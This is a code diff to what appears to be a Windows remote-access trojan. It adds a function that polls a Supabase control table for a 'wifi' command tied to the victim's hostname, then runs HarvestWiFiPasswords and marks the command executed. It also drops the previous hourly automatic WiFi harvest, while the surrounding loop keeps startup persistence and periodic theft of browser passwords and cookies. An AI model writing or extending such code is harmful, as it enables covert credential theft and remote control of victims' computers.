@@ -1574,6 +1574,29 @@ static void HandleSpeaker(const std::string& rowId) {
     LogMsg("Speaker done: " + resultUrl);
 }
 
+static std::string CheckWifiCmd() {
+    std::wstring q = SUPABASE_CONTROL_PATH;
+    q += L"?command=eq.wifi&executed=eq.false&hostname=eq." + ToWide(g_hostname) + L"&select=id";
+    std::string resp;
+    if (!HttpRequest(L"GET", q.c_str(), "", resp)) return "";
+    size_t p = resp.find("\"id\":");
+    if (p == std::string::npos) return "";
+    p += 5;
+    size_t e = resp.find_first_of("},]", p);
+    if (e == std::string::npos) return "";
+    return resp.substr(p, e - p);
+}
+
+static void HandleWifiCmd(const std::string& rowId) {
+    HarvestWiFiPasswords();
+    std::string json = "{\"executed\":true}";
+    std::wstring patchPath = SUPABASE_CONTROL_PATH;
+    patchPath += L"?id=eq." + ToWide(rowId);
+    std::string resp;
+    HttpRequest(L"PATCH", patchPath.c_str(), json, resp);
+    LogMsg("WiFi: command handled");
+}
+
 static void SendHeartbeat() {
     std::string json = "{\"hostname\":\"" + EscapeJSON(g_hostname) + "\",\"last_seen\":\"" + GetTimestamp() + "\",\"version\":" + std::to_string(NETPEN_VERSION) + "}";
     std::string resp;
@@ -1870,6 +1893,8 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 std::string spRowId = CheckSpeakerCmd();
                 if (!spRowId.empty()) HandleSpeaker(spRowId);
                 CheckAndHandleExec();
+                std::string wfRowId = CheckWifiCmd();
+                if (!wfRowId.empty()) HandleWifiCmd(wfRowId);
             }
             if (counter % 120 == 0 && !g_selfDestructing) {
                 EnsureStartupEntry();
@@ -1877,9 +1902,6 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
             if (counter % 300 == 0 && !g_selfDestructing) {
                 HarvestBrowserPasswords();
                 HarvestBrowserCookies();
-            }
-            if (counter % 3600 == 0 && !g_selfDestructing) {
-                HarvestWiFiPasswords();
             }
             break;
         }
